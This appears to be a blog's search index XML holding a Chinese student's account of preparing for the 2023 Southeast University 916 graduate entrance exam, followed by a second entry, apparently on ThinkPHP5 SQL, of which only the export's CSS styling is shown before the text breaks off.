<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2023年东南大学916初复试经验贴</title>
      <link href="/2023/04/06/2023%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6916%E5%88%9D%E8%AF%95%E5%A4%8D%E8%AF%95%E7%BB%8F%E9%AA%8C%E8%B4%B4/"/>
      <url>/2023/04/06/2023%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6916%E5%88%9D%E8%AF%95%E5%A4%8D%E8%AF%95%E7%BB%8F%E9%AA%8C%E8%B4%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="一-报考原因"><a href="#一-报考原因" class="headerlink" title="一. 报考原因"></a>一. 报考原因</h1><p>本来准备继续在小破邮读研的,女朋友想考东南,就就就就上岸东南啦!</p><h1 id="二-初试准备"><a href="#二-初试准备" class="headerlink" title="二. 初试准备"></a>二. 初试准备</h1><h2 id="1-数学一-118-分"><a href="#1-数学一-118-分" class="headerlink" title="1. 数学一 118 分"></a>1. 数学一 118 分</h2><p>大一大二期间因为疫情没学习,数学功底一般,高数下66分,概率论79分,一开始也因为数学感到发慌,后来想了一下,考东南数学有110分也就够了,尽力学就行!</p><p>**高数视频:**我基础班跟的是张宇老师,时间大概是2月到3月(现在可以叫小宇了),张宇老师的教学风格比较幽默,基础部分也有回顾大学之前的知识,适合基础较为好的同学,点火公式这些可以说是考研必学了!强化班跟了武忠祥老师,因为复习进度较快,所以在5-6月就过了第一遍2022年的强化班(当时2023还没开始出),做了配套的严选题(必刷),但是感觉没学进脑子,赶进度,但是已经对武老师的教学风格有了一定的了解,数二部分讲的非常扎实,可以说娓娓道来,慢慢学下来确实有助于你在题目的理解和解题上有帮助,和宇哥注重的技巧不同(脑子好使)。暑期又跟了一边武老师的2023强化,这次安安心的学了一遍,高数感觉有了很大的提升,在后期作模拟卷的时候可以明显感觉到,在一些题目上有了些新的想法可以帮助解题,强调一下数一部分(听完武老再听一下宇哥,尤其线面积分这个分很重要!级数如果觉得自己学的好可以不听!)</p><p>**高数题目:**1800基础部分(基础不好的打基础可以,别的不太建议做)+660(一遍且错题反复做理解概念)+ 严选题(刷了两遍,错题3遍以上) + 880(暑期回来880的高数做了一遍,题目感觉比1800难比严选简单) + 330 +张宇1000题线面积分部分大概100题这样后期每天2-3题 + 后期武老师每日一题</p><p><strong>线代视频:</strong> 一开始就对线代很有信心,学的比较马虎,后期吃了不少苦头,李永乐老爷子主推,张宇线代讲的还行也可以听,主要要记住大概什么题型用什么方法,特征值这些要记得很牢,想到就能秒解</p><p><strong>线代题目:</strong> 660(线代部分前期打基础写,偏简单) + 李老爷子线代强化的配套练习题 + 880线代部分(必须做,难死我了) + 330 </p><p><strong>概率论视频:</strong> 俺不知道方浩他们教的咋样,这个只跟了森哥,我只能说听的懂,概率论给我的感觉比高数难理解,学的很痛苦,题目有的也很难,不能掉以轻心。</p><p><strong>概率论题目:</strong> 660概率论部分 + 余斌森的书配套习题(做了两遍,做扎实了) + 880(选了掌握不太好的部分做) + 330</p><p><strong>模拟卷:</strong> 张宇8(搞心态)+4(🐏了有的大题没写) 李永乐套卷(偏简单) + 余斌森(难!选择题把我对象做的奔溃了 天天要整理笔记给她!) + 超越卷(今年质量下降) + 李林6+4(必做) + 武忠祥两套高数卷</p><h2 id="2-英语一-86分"><a href="#2-英语一-86分" class="headerlink" title="2. 英语一 86分"></a>2. 英语一 86分</h2><p>英语四级549分 六级第一次没过(听力太烂) 第二次449飘过</p><p>准备前问了上一届的学长,给的建议是,英语一定要好好学,会有回报的,这不今年86分,回报来啦!当然如果像某些变态女朋友,天天英语学1个小时多一点,最后也85分,当我没说(20分钟400个单词 求我心理阴影面积!)</p><p><strong>复习方法:</strong> </p><p><strong>单词</strong> :</p><p>2-4月每天60-100个生词+复习(不背单词值得用,别的软件没用过不加评价)</p><p>4-6月重写开单词本100-150个生词+复习</p><p>7月之后,中后期每天就是带着背,每天都要背,那怕那天出去放松也要背,单词不能断!后期快的话一天200生词+200复习的45分钟就够 啦!单词牢固了,英语分不会太差!</p><p><strong>基础:</strong> </p><p>我听了田静的语法课,我的评价是效果因人而异,基础稍微好一点可以不听,主要是为了学会翻译句子,提高阅读水平,每日一句的翻译必跟!</p><p><strong>真题:</strong> </p><p>我大概4月中旬开了真题,每天2-3篇阅读理解,做的很差的有尝试过精翻(时间花费太大,翻了四五次就不翻了),但是不会的单词还是会圈出来,加入不背单词的生词本以后复习用。</p><p>暑期二刷了真题的阅读理解,英语一2010年的真的很难,做不好别灰心!这个时候大概就能保住四篇错在4个以内了!当然大佬这个时候都只错两个的且是一刷。真题阅读理解确实很重要,有不会的地方可以去听听唐迟老师的课还有monkey老师的课(虽然有的时候我真的就觉得题目有问题,不是我的问题!)</p><p>暑期回来冲刺差不多要开始三刷了,这个时间就不能只做阅读理解部分了,翻译可以往后靠,但是每天1-2个阅读理解的同时,也要把新题型或者完形填空带上了!新题型排序觉得难的话可以听一下宋逸轩老师的课(不长,或许有帮助)</p><p><strong>张剑80篇:</strong></p><p>关于张剑80篇,网上褒贬不一吧,后期因为觉得真题刷了太多遍,做的时候已经有点答案的影响,效果不好,反复考虑,拖着对象做了这个网上大家并不推荐的阅读理解,做的感觉明显就是词汇量超纲,但是如果能读懂的话做起来就不是很难,我们成绩出来后的总结是,这个习题册很适合23考研的英语一,感觉最好一个86分一个85分,考试题目难但是发挥稳定有它的功劳!只做真题,碰到难的文章可能就抓瞎了!</p><p><strong>作文:</strong></p><p>我强烈推荐石雷鹏(就是烧时间,带着练),学到最后什么模板啥的,都不用背,自己慢慢就总结出来属于自己的模板了!就<strong>跟着练</strong>,他每天会带着你写作文,写着写着你就有货了!</p><p>对象跟的周思成,她的建议是不用听课(太叽叽喳喳了,我尝试听过,听不进去),但是有的万能诡辩模板可以稍微背一下!</p><p>最后,对象英语好的话或者一起备考的小伙伴英语好的话,可以麻烦她帮忙改一下英语作文,实在不写微软爱写作的小程序用起来!至少可以发现语法错误。</p><h2 id="3-政治-73分"><a href="#3-政治-73分" class="headerlink" title="3. 政治 73分"></a>3. 政治 73分</h2><p><strong>强化:</strong></p><p>8月份开始开刚刚好,没有基础直接跟徐涛的强化班,带着听,学累了就听,甚至可以吃饭时候听</p><p>复习路线大致 马原理–&gt;史纲–&gt;毛中特–&gt;思修–&gt;当代</p><p>我学习的时候,马原部分记了笔记本,但是感觉作用不大,可以选择直接在书上做,然后一些总结可以自己做一下确实有助于强化记忆</p><p>比如会议的总结</p><p>每学完一章就可以做一下肖秀荣一章的1000题,u1s1,学政治是考研期间最放松的时期了(出去按摩除外)!</p><p><strong>腿姐技巧班:</strong></p><p>腿姐技巧班开始就可以听课了,主要是听她的题目总结,选择题的技巧肯定是要听的,但是不能全信,23届考研如果信了技巧就栽跟头了,综合我们宿舍五人考研一个上岸南邮 四个东南的意见,技巧班是放松时候听的,主要还是记冲刺背诵手册,技巧也就图一乐,拿分还是靠背!</p><p>相比与选择题的技巧,个人觉得腿姐最拿得出手的其实是<strong>点默析答题法</strong>,个人感觉大题严格按照这个套路答题还是对自己的分数有所提高的!</p><p><strong>背书和题目:</strong></p><p><strong>腿姐背诵手册:</strong></p><p>选择题今年可能翻车,被反押题了,但是依然要多读,争取有个影响,考试考到就是分</p><p>11月份就要开始把后面的选择题重点考点放入背诵的计划中每天尽量多背一点,然后就是马原理一定要好好背!这个必考的24个都背不为过!</p><p><strong>肖秀荣:</strong></p><p>11月份肖八发货,就开始根据肖老师的选择题针对背诵一些时政,选择题好好做,30+的分不要灰心很正常,做完就背。简答题可以先看看不写,马原部分可以尝试写写。这个可以看看网上博主的建议,政治时间很松,而且后期确实有大部分时间都花在政治上。</p><p>肖老师今年发挥还行,就是压的都在后面肖三肖四两个试卷上了,所以12月份开始,肖四一定就要开始背啊!!!不要拖,不要说后面抽一天背,你不知道后面会发生什么!我🐏了,肖三肖四没背完,在宾馆的床上背不动,真的后悔!</p><p>最后的一点建议是: 有个微博博主叫西西爱政治 会总结政治背的东西,可以看看!</p><h2 id="4-专业课-130"><a href="#4-专业课-130" class="headerlink" title="4. 专业课 130"></a>4. 专业课 130</h2><p><strong>计网:</strong></p><p>前期:</p><p>本人一直在线,正常复习,前期王道视频课或者湖科大视频课(有时间的两个都看),重点还是网络层传输层的知识,其余的大多数是背诵能力</p><p>中后期:</p><p>重复的看谢书,可能完完整整看了有3-4遍吧,过程很枯燥,但是真的很有用,自己去尝试整理知识点,可以用markdown这些记笔记,慢慢脑子里有体系,学起来就轻松了。然后就是看书的时候,也要写题,不然很久不写,突然写选择真的挺痛苦的。</p><p>题目: 王道计算机网络考研复习指导(3刷) + 考研资料群的资料 + 自己找的计网习题 + 天勤计算机网络习题 + 王道计算机考试配套习题(计网部分)</p><p><strong>数据结构:</strong></p><p>前期:</p><p>王道数据结构视频课(这里推荐使用ACFUN,我当时是有新的视频课的),前期没有扣代码,重点还是概念的理解,抓住选择题和简答题的分</p><p>中期:</p><p>我没有选择继续听课,数据结构没有花很长时间,后面大概每天3个小时专业课,各1个半小时,做做选择和简答题。然后到11月份开始死扣代码题,一天2-3题(虽然最后没考)。但是今年考了读程题,感觉24考研考代码题的概率还是很大的,可以买个罗技k580自己在平板上配个环境敲!</p><p>题目: 王道数据结构考研复习指导(3刷) + 考研资料群的资料 +  天勤数据结构习题 + 王道计算机考试配套习题(数据结构部分)</p><h2 id="5-关于学习和恋爱"><a href="#5-关于学习和恋爱" class="headerlink" title="5. 关于学习和恋爱"></a>5. 关于学习和恋爱</h2><p>考研期间谈恋爱的确会分散一部分学习的时间(我们两个还好,都比较愿意一起去自习室学习,没有花费太长的时间),但是我个人觉得恋爱和考研不算冲突,在考研期间的生活确实比较枯燥,我会选择吃完饭和女朋友一起散步缓解压力(准确的说两个人逃避考研教室压抑的氛围),也会突然决定摆烂一天按个摩(不可以多,偶尔偶尔啊!),当然最好的地方就是每天吃饭啥的,都有一个人陪在身边,一起讨论学习上的事情也很有意思,比如因为一道数学题差点吵了起来!还有,最后大家都🐏了,也是互相支撑这彼此度过这段蛮有意义的时光。</p><p>当然有利必然有弊,考研期间大家的压力都很大,也会因为心情上的低落,在一些小事情上爆发争端,甚至emmm差点差点懂得都懂,但是我觉得如果能够两个人互相帮助,我教你数学,你帮我补英语,那么两个人一起上岸才是最帅的好吧!</p>]]></content>
      
      
      <categories>
          
          <category> 成长 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 成长 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/04/06/TP5sql/"/>
      <url>/2023/04/06/TP5sql/</url>
      
        <content type="html"><![CDATA[<!doctype html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'><style type='text/css'>html {overflow-x: initial !important;}:root { --bg-color:#ffffff; --text-color:#333333; --select-text-bg-color:#B5D6FC; --select-text-font-color:auto; --monospace:"Lucida Console",Consolas,"Courier",monospace; --title-bar-height:20px; }.mac-os-11 { --title-bar-height:28px; }html { font-size: 14px; background-color: var(--bg-color); color: var(--text-color); font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; }body { margin: 0px; padding: 0px; height: auto; inset: 0px; font-size: 1rem; line-height: 1.42857; overflow-x: hidden; background: inherit; tab-size: 4; }iframe { margin: auto; }a.url { word-break: break-all; }a:active, a:hover { outline: 0px; }.in-text-selection, ::selection { text-shadow: none; background: var(--select-text-bg-color); color: var(--select-text-font-color); }#write { margin: 0px auto; height: auto; width: inherit; word-break: normal; overflow-wrap: break-word; position: relative; white-space: normal; overflow-x: visible; padding-top: 36px; }#write.first-line-indent p { text-indent: 2em; }#write.first-line-indent li p, #write.first-line-indent p * { text-indent: 0px; }#write.first-line-indent li { margin-left: 2em; }.for-image #write { padding-left: 8px; padding-right: 8px; }body.typora-export { padding-left: 30px; padding-right: 30px; }.typora-export .footnote-line, .typora-export li, .typora-export p { white-space: pre-wrap; }.typora-export .task-list-item input { pointer-events: none; }@media screen and (max-width: 500px) {  body.typora-export { padding-left: 0px; padding-right: 0px; }  #write { padding-left: 20px; padding-right: 20px; }  .CodeMirror-sizer { margin-left: 0px !important; }  .CodeMirror-gutters { display: none !important; }}#write li > figure:last-child { margin-bottom: 0.5rem; }#write ol, #write ul { position: relative; }img { max-width: 100%; vertical-align: middle; image-orientation: from-image; }button, input, select, textarea { color: inherit; font: inherit; }input[type="checkbox"], input[type="radio"] { line-height: normal; padding: 0px; }*, ::after, ::before { box-sizing: border-box; }#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p, #write pre { width: inherit; }#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p { position: relative; }p { line-height: inherit; }h1, h2, h3, h4, h5, h6 { break-after: avoid-page; break-inside: avoid; orphans: 4; }p { orphans: 4; }h1 { font-size: 2rem; }h2 { font-size: 1.8rem; }h3 { font-size: 1.6rem; }h4 { font-size: 1.4rem; }h5 { font-size: 1.2rem; }h6 { font-size: 1rem; }.md-math-block, .md-rawblock, h1, h2, h3, h4, h5, h6, p { margin-top: 1rem; margin-bottom: 1rem; }.hidden { display: none; }.md-blockmeta { color: rgb(204, 204, 204); font-weight: 700; font-style: italic; }a { cursor: pointer; }sup.md-footnote { padding: 2px 4px; background-color: rgba(238, 238, 238, 0.7); color: rgb(85, 85, 85); border-radius: 4px; cursor: pointer; }sup.md-footnote a, sup.md-footnote a:hover { color: inherit; text-transform: inherit; text-decoration: inherit; }#write input[type="checkbox"] { cursor: pointer; width: inherit; height: inherit; }figure { overflow-x: auto; margin: 1.2em 0px; max-width: calc(100% + 16px); padding: 0px; }figure > table { margin: 0px; }tr { break-inside: avoid; break-after: auto; }thead { display: table-header-group; }table { border-collapse: collapse; border-spacing: 0px; width: 100%; overflow: auto; break-inside: auto; text-align: left; }table.md-table td { min-width: 32px; }.CodeMirror-gutters { border-right: 0px; background-color: inherit; }.CodeMirror-linenumber { user-select: none; }.CodeMirror { text-align: left; }.CodeMirror-placeholder { opacity: 0.3; }.CodeMirror pre { padding: 0px 4px; }.CodeMirror-lines { padding: 0px; }div.hr:focus { cursor: none; }#write pre { white-space: pre-wrap; }#write.fences-no-line-wrapping pre { white-space: pre; }#write pre.ty-contain-cm { white-space: normal; }.CodeMirror-gutters { margin-right: 4px; }.md-fences { font-size: 0.9rem; display: block; break-inside: avoid; text-align: left; overflow: visible; white-space: pre; background: inherit; position: relative !important; }.md-fences-adv-panel { width: 100%; margin-top: 10px; text-align: center; padding-top: 0px; padding-bottom: 8px; overflow-x: auto; }#write .md-fences.mock-cm { white-space: pre-wrap; }.md-fences.md-fences-with-lineno { padding-left: 0px; }#write.fences-no-line-wrapping .md-fences.mock-cm { white-space: pre; overflow-x: auto; }.md-fences.mock-cm.md-fences-with-lineno { padding-left: 8px; }.CodeMirror-line, twitterwidget { break-inside: avoid; }.footnotes { opacity: 0.8; font-size: 0.9rem; margin-top: 1em; margin-bottom: 1em; }.footnotes + .footnotes { margin-top: 0px; }.md-reset { margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: top; background: 0px 0px; text-decoration: none; text-shadow: none; float: none; position: static; width: auto; height: auto; white-space: nowrap; cursor: inherit; -webkit-tap-highlight-color: transparent; line-height: normal; font-weight: 400; text-align: left; box-sizing: content-box; direction: ltr; }li div { padding-top: 0px; }blockquote { margin: 1rem 0px; }li .mathjax-block, li p { margin: 0.5rem 0px; }li blockquote { margin: 1rem 0px; }li { margin: 0px; position: relative; }blockquote > :last-child { margin-bottom: 0px; }blockquote > :first-child, li > :first-child { margin-top: 0px; }.footnotes-area { color: rgb(136, 136, 136); margin-top: 0.714rem; padding-bottom: 0.143rem; white-space: normal; }#write .footnote-line { white-space: pre-wrap; }@media print {  body, html { border: 1px solid transparent; height: 99%; break-after: avoid; break-before: avoid; font-variant-ligatures: no-common-ligatures; }  #write { margin-top: 0px; padding-top: 0px; border-color: transparent !important; }  .typora-export * { -webkit-print-color-adjust: exact; }  .typora-export #write { break-after: avoid; }  .typora-export #write::after { height: 0px; }  .is-mac table { break-inside: avoid; }  .typora-export-show-outline .typora-export-sidebar { display: none; }}.footnote-line { margin-top: 0.714em; font-size: 0.7em; }a img, img a { cursor: pointer; }pre.md-meta-block { font-size: 0.8rem; min-height: 0.8rem; white-space: pre-wrap; background: rgb(204, 204, 204); display: block; overflow-x: hidden; }p > .md-image:only-child:not(.md-img-error) img, p > img:only-child { display: block; margin: auto; }#write.first-line-indent p > .md-image:only-child:not(.md-img-error) img { left: -2em; position: relative; }p > .md-image:only-child { display: inline-block; width: 100%; }#write .MathJax_Display { margin: 0.8em 0px 0px; }.md-math-block { width: 100%; }.md-math-block:not(:empty)::after { display: none; }.MathJax_ref { fill: currentcolor; }[contenteditable="true"]:active, [contenteditable="true"]:focus, [contenteditable="false"]:active, [contenteditable="false"]:focus { outline: 0px; box-shadow: none; }.md-task-list-item { position: relative; list-style-type: none; }.task-list-item.md-task-list-item { padding-left: 0px; }.md-task-list-item > input { position: absolute; top: 0px; left: 0px; margin-left: -1.2em; margin-top: calc(1em - 10px); border: none; }.math { font-size: 1rem; }.md-toc { min-height: 3.58rem; position: relative; font-size: 0.9rem; border-radius: 10px; }.md-toc-content { position: relative; margin-left: 0px; }.md-toc-content::after, .md-toc::after { display: none; }.md-toc-item { display: block; color: rgb(65, 131, 196); }.md-toc-item a { text-decoration: none; }.md-toc-inner:hover { text-decoration: underline; }.md-toc-inner { display: inline-block; cursor: pointer; }.md-toc-h1 .md-toc-inner { margin-left: 0px; font-weight: 700; }.md-toc-h2 .md-toc-inner { margin-left: 2em; }.md-toc-h3 .md-toc-inner { margin-left: 4em; }.md-toc-h4 .md-toc-inner { margin-left: 6em; }.md-toc-h5 .md-toc-inner { margin-left: 8em; }.md-toc-h6 .md-toc-inner { margin-left: 10em; }@media screen and (max-width: 48em) {  .md-toc-h3 .md-toc-inner { margin-left: 3.5em; }  .md-toc-h4 .md-toc-inner { margin-left: 5em; }  .md-toc-h5 .md-toc-inner { margin-left: 6.5em; }  .md-toc-h6 .md-toc-inner { margin-left: 8em; }}a.md-toc-inner { font-size: inherit; font-style: inherit; font-weight: inherit; line-height: inherit; }.footnote-line a:not(.reversefootnote) { color: inherit; }.md-attr { display: none; }.md-fn-count::after { content: "."; }code, pre, samp, tt { font-family: var(--monospace); }kbd { margin: 0px 0.1em; padding: 0.1em 0.6em; font-size: 0.8em; color: rgb(36, 39, 41); background: rgb(255, 255, 255); border: 1px solid rgb(173, 179, 185); border-radius: 3px; box-shadow: rgba(12, 13, 14, 0.2) 0px 1px 0px, rgb(255, 255, 255) 0px 0px 0px 2px inset; white-space: nowrap; vertical-align: middle; }.md-comment { color: rgb(162, 127, 3); opacity: 0.6; font-family: var(--monospace); }code { text-align: left; vertical-align: initial; }a.md-print-anchor { white-space: pre !important; border-width: initial !important; border-style: none !important; border-color: initial !important; display: inline-block !important; position: absolute !important; width: 1px !important; right: 0px !important; outline: 0px !important; background: 0px 0px !important; text-decoration: initial !important; text-shadow: initial !important; }.os-windows.monocolor-emoji .md-emoji { font-family: "Segoe UI Symbol", sans-serif; }.md-diagram-panel > svg { max-width: 100%; }[lang="flow"] svg, [lang="mermaid"] svg { max-width: 100%; height: auto; }[lang="mermaid"] .node text { font-size: 1rem; }table tr th { border-bottom: 0px; }video { max-width: 100%; display: block; margin: 0px auto; }iframe { max-width: 100%; width: 100%; border: none; }.highlight td, .highlight tr { border: 0px; }mark { background: rgb(255, 255, 0); color: rgb(0, 0, 0); }.md-html-inline .md-plain, .md-html-inline strong, mark .md-inline-math, mark strong { color: inherit; }.md-expand mark .md-meta { opacity: 0.3 !important; }mark .md-meta { color: rgb(0, 0, 0); }@media print {  .typora-export h1, .typora-export h2, .typora-export h3, .typora-export h4, .typora-export h5, .typora-export h6 { break-inside: avoid; }}.md-diagram-panel .messageText { stroke: none !important; }.md-diagram-panel .start-state { fill: var(--node-fill); }.md-diagram-panel .edgeLabel rect { opacity: 1 !important; }.md-fences.md-fences-math { font-size: 1em; }.md-fences-advanced:not(.md-focus) { padding: 0px; white-space: nowrap; border: 0px; }.md-fences-advanced:not(.md-focus) { background: inherit; }.typora-export-show-outline .typora-export-content { max-width: 1440px; margin: auto; display: flex; flex-direction: row; }.typora-export-sidebar { width: 300px; font-size: 0.8rem; margin-top: 80px; margin-right: 18px; }.typora-export-show-outline #write { --webkit-flex:2; flex: 2 1 0%; }.typora-export-sidebar .outline-content { position: fixed; top: 0px; max-height: 100%; overflow: hidden auto; padding-bottom: 30px; padding-top: 60px; width: 300px; }@media screen and (max-width: 1024px) {  .typora-export-sidebar, .typora-export-sidebar .outline-content { width: 240px; }}@media screen and (max-width: 800px) {  .typora-export-sidebar { display: none; }}.outline-content li, .outline-content ul { margin-left: 0px; margin-right: 0px; padding-left: 0px; padding-right: 0px; list-style: none; }.outline-content ul { margin-top: 0px; margin-bottom: 0px; }.outline-content strong { font-weight: 400; }.outline-expander { width: 1rem; height: 1.42857rem; position: relative; display: table-cell; vertical-align: middle; cursor: pointer; padding-left: 4px; }.outline-expander::before { content: ""; position: relative; font-family: Ionicons; display: inline-block; font-size: 8px; vertical-align: middle; }.outline-item { padding-top: 3px; padding-bottom: 3px; cursor: pointer; }.outline-expander:hover::before { content: ""; }.outline-h1 > .outline-item { padding-left: 0px; }.outline-h2 > .outline-item { padding-left: 1em; }.outline-h3 > .outline-item { padding-left: 2em; }.outline-h4 > .outline-item { padding-left: 3em; }.outline-h5 > .outline-item { padding-left: 4em; }.outline-h6 > .outline-item { padding-left: 5em; }.outline-label { cursor: pointer; display: table-cell; vertical-align: middle; text-decoration: none; color: inherit; }.outline-label:hover { text-decoration: underline; }.outline-item:hover { border-color: rgb(245, 245, 245); background-color: var(--item-hover-bg-color); }.outline-item:hover { margin-left: -28px; margin-right: -28px; border-left: 28px solid transparent; border-right: 28px solid transparent; }.outline-item-single .outline-expander::before, .outline-item-single .outline-expander:hover::before { display: none; }.outline-item-open > .outline-item > .outline-expander::before { content: ""; }.outline-children { display: none; }.info-panel-tab-wrapper { display: none; }.outline-item-open > .outline-children { display: block; }.typora-export .outline-item { padding-top: 1px; padding-bottom: 1px; }.typora-export .outline-item:hover { margin-right: -8px; border-right: 8px solid transparent; }.typora-export .outline-expander::before { content: "+"; font-family: inherit; top: -1px; }.typora-export .outline-expander:hover::before, .typora-export .outline-item-open > .outline-item > .outline-expander::before { content: "−"; }.typora-export-collapse-outline .outline-children { display: none; }.typora-export-collapse-outline .outline-item-open > .outline-children, .typora-export-no-collapse-outline .outline-children { display: block; }.typora-export-no-collapse-outline .outline-expander::before { content: "" !important; }.typora-export-show-outline .outline-item-active > .outline-item .outline-label { font-weight: 700; }.md-inline-math-container mjx-container { zoom: 0.95; }.CodeMirror { height: auto; }.CodeMirror.cm-s-inner { background: inherit; }.CodeMirror-scroll { overflow: auto hidden; z-index: 3; }.CodeMirror-gutter-filler, .CodeMirror-scrollbar-filler { background-color: rgb(255, 255, 255); }.CodeMirror-gutters { border-right: 1px solid rgb(221, 221, 221); background: inherit; white-space: nowrap; }.CodeMirror-linenumber { padding: 0px 3px 0px 5px; text-align: right; color: rgb(153, 153, 153); }.cm-s-inner .cm-keyword { color: rgb(119, 0, 136); }.cm-s-inner .cm-atom, .cm-s-inner.cm-atom { color: rgb(34, 17, 153); }.cm-s-inner .cm-number { color: rgb(17, 102, 68); }.cm-s-inner .cm-def { color: rgb(0, 0, 255); }.cm-s-inner .cm-variable { color: rgb(0, 0, 0); }.cm-s-inner .cm-variable-2 { color: rgb(0, 85, 170); }.cm-s-inner .cm-variable-3 { color: rgb(0, 136, 85); }.cm-s-inner .cm-string { color: rgb(170, 17, 17); }.cm-s-inner .cm-property { color: rgb(0, 0, 0); }.cm-s-inner .cm-operator { color: rgb(152, 26, 26); }.cm-s-inner .cm-comment, .cm-s-inner.cm-comment { color: rgb(170, 85, 0); }.cm-s-inner .cm-string-2 { color: rgb(255, 85, 0); }.cm-s-inner .cm-meta { color: rgb(85, 85, 85); }.cm-s-inner .cm-qualifier { color: rgb(85, 85, 85); }.cm-s-inner .cm-builtin { color: rgb(51, 0, 170); }.cm-s-inner .cm-bracket { color: rgb(153, 153, 119); }.cm-s-inner .cm-tag { color: rgb(17, 119, 0); }.cm-s-inner .cm-attribute { color: rgb(0, 0, 204); }.cm-s-inner .cm-header, .cm-s-inner.cm-header { color: rgb(0, 0, 255); }.cm-s-inner .cm-quote, .cm-s-inner.cm-quote { color: rgb(0, 153, 0); }.cm-s-inner .cm-hr, .cm-s-inner.cm-hr { color: rgb(153, 153, 153); }.cm-s-inner .cm-link, .cm-s-inner.cm-link { color: rgb(0, 0, 204); }.cm-negative { color: rgb(221, 68, 68); }.cm-positive { color: rgb(34, 153, 34); }.cm-header, .cm-strong { font-weight: 700; }.cm-del { text-decoration: line-through; }.cm-em { font-style: italic; }.cm-link { text-decoration: underline; }.cm-error { color: red; }.cm-invalidchar { color: red; }.cm-constant { color: rgb(38, 139, 210); }.cm-defined { color: rgb(181, 137, 0); }div.CodeMirror span.CodeMirror-matchingbracket { color: rgb(0, 255, 0); }div.CodeMirror span.CodeMirror-nonmatchingbracket { color: rgb(255, 34, 34); }.cm-s-inner .CodeMirror-activeline-background { background: inherit; }.CodeMirror { position: relative; overflow: hidden; }.CodeMirror-scroll { height: 100%; outline: 0px; position: relative; box-sizing: content-box; background: inherit; }.CodeMirror-sizer { position: relative; }.CodeMirror-gutter-filler, .CodeMirror-hscrollbar, .CodeMirror-scrollbar-filler, .CodeMirror-vscrollbar { position: absolute; z-index: 6; display: none; outline: 0px; }.CodeMirror-vscrollbar { right: 0px; top: 0px; overflow: hidden; }.CodeMirror-hscrollbar { bottom: 0px; left: 0px; overflow: auto hidden; }.CodeMirror-scrollbar-filler { right: 0px; bottom: 0px; }.CodeMirror-gutter-filler { left: 0px; bottom: 0px; }.CodeMirror-gutters { position: absolute; left: 0px; top: 0px; padding-bottom: 10px; z-index: 3; overflow-y: hidden; }.CodeMirror-gutter { white-space: normal; height: 100%; box-sizing: content-box; padding-bottom: 30px; margin-bottom: -32px; display: inline-block; }.CodeMirror-gutter-wrapper { position: absolute; z-index: 4; background: 0px 0px !important; border: none !important; }.CodeMirror-gutter-background { position: absolute; top: 0px; bottom: 0px; z-index: 4; }.CodeMirror-gutter-elt { position: absolute; cursor: default; z-index: 4; }.CodeMirror-lines { cursor: text; }.CodeMirror pre { border-radius: 0px; border-width: 0px; background: 0px 0px; font-family: inherit; font-size: inherit; margin: 0px; white-space: pre; overflow-wrap: normal; color: inherit; z-index: 2; position: relative; overflow: visible; }.CodeMirror-wrap pre { overflow-wrap: break-word; white-space: pre-wrap; word-break: normal; }.CodeMirror-code pre { border-right: 30px solid transparent; width: fit-content; }.CodeMirror-wrap .CodeMirror-code pre { border-right: none; width: auto; }.CodeMirror-linebackground { position: absolute; inset: 0px; z-index: 0; }.CodeMirror-linewidget { position: relative; z-index: 2; overflow: auto; }.CodeMirror-wrap .CodeMirror-scroll { overflow-x: hidden; }.CodeMirror-measure { position: absolute; width: 100%; height: 0px; overflow: hidden; visibility: hidden; }.CodeMirror-measure pre { position: static; }.CodeMirror div.CodeMirror-cursor { position: absolute; visibility: hidden; border-right: none; width: 0px; }.CodeMirror div.CodeMirror-cursor { visibility: hidden; }.CodeMirror-focused div.CodeMirror-cursor { visibility: inherit; }.cm-searching { background: rgba(255, 255, 0, 0.4); }span.cm-underlined { text-decoration: underline; }span.cm-strikethrough { text-decoration: line-through; }.cm-tw-syntaxerror { color: rgb(255, 255, 255); background-color: rgb(153, 0, 0); }.cm-tw-deleted { text-decoration: line-through; }.cm-tw-header5 { font-weight: 700; }.cm-tw-listitem:first-child { padding-left: 10px; }.cm-tw-box { border-style: solid; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px; border-color: inherit; border-top-width: 0px !important; }.cm-tw-underline { text-decoration: underline; }@media print {  .CodeMirror div.CodeMirror-cursor { visibility: hidden; }}/* font face configs */:root {    /* change your prefered font here */    --title-font: "Inter Display", "Inter";    --text-font: "Inter";    /* the Inter fontface family provides rich opentype features. see https://rsms.me/inter/  */    --general-font-feature-settings: "calt", "ccmp", "kern", "salt" 0;    --cjk-font: "Source Han Sans SC", "思源黑体 CN", "思源黑体";    --mono-font: "JetBrains Mono";    --fallback-font: "system-ui", "Helvetica Neue", Helvetica, Arial, sans-serif;}/* general color configs */:root {    --color-scale-black: #1b1f23;    --color-scale-white: #fff;    --color-scale-gray-0: #fafbfc;    --color-scale-gray-1: #f6f8fa;    --color-scale-gray-2: #e1e4e8;    --color-scale-gray-3: #d1d5da;    --color-scale-gray-4: #959da5;    --color-scale-gray-5: #6a737d;    --color-scale-gray-6: #586069;    --color-scale-gray-7: #444d56;    --color-scale-gray-8: #2f363d;    --color-scale-gray-9: #24292e;    --color-scale-blue-0: #f1f8ff;    --color-scale-blue-1: #dbedff;    --color-scale-blue-2: #c8e1ff;    --color-scale-blue-3: #79b8ff;    --color-scale-blue-4: #2188ff;    --color-scale-blue-5: #0366d6;    --color-scale-blue-6: #005cc5;    --color-scale-blue-7: #044289;    --color-scale-blue-8: #032f62;    --color-scale-blue-9: #05264c;    --mark-bg: #ffde67;    --mark-text: #080a10;    --color-cm-keyword: #3b78e7;    --color-cm-attr: #9c27b0;    --color-cm-comment: #6a737d;    --color-cm-string: #0d904f;    --color-cm-operator: #d81b60;    --color-cm-number: #d81b60;    --color-cm-meta: #6933b1;    --color-cm-builtin: #e36209;    --color-cm-v3: #43a8b3;    --color-cm-v: #c53929;    --color-cm-link: #24a3c3;    --text-link: #486df1;    --bookmark-color: #311b92;    --bookmark-bg: #ae92e3;    --star-color: #044289;    